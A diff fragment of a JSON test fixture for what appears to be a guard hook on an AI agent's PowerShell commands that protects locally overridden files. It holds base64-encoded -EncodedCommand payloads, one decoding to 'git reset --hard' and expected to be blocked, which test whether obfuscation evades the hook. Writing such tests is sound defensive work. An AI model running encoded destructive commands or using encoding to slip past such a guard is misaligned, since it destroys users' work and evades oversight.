+        "tool_input": {
+          "command": "powershell -EncodedCommand ZwBpAHQAIABzAHQAYQB0AHUAcwA="
+        }
+      },
+      "expect": "SILENT"
+    },
+    {
+      "label": "清單內檔 dirty·R3z 對照 -EncodedCommand 解出 git reset --hard 照擋［2026-10-19 R3 收口：解不出的編碼內容不擋但 stderr＋additionalContext 提醒「本閘沒檢查」；兩條路徑都跑］",
+      "setup": {
+        "files": {
+          "conf.txt": "a=1\n",
+          ".claude/local-overrides.yml": "app:\n  repo: .\n  files:\n    - path: conf.txt\n      reason: 本機連線字串\n"
+        },
+        "commit": true,
+        "files_after_commit": {
+          "conf.txt": "a=LOCAL\n"
+        }
+      },
+      "payload": {
+        "tool_name": "PowerShell",
+        "tool_input": {
+          "command": "powershell -EncodedCommand ZwBpAHQAIAByAGUAcwBlAHQAIAAtAC0AaABhAHIAZAA="
+        }
+      },
+      "expect": "BLOCK"
     }
   ],
   "variants": {
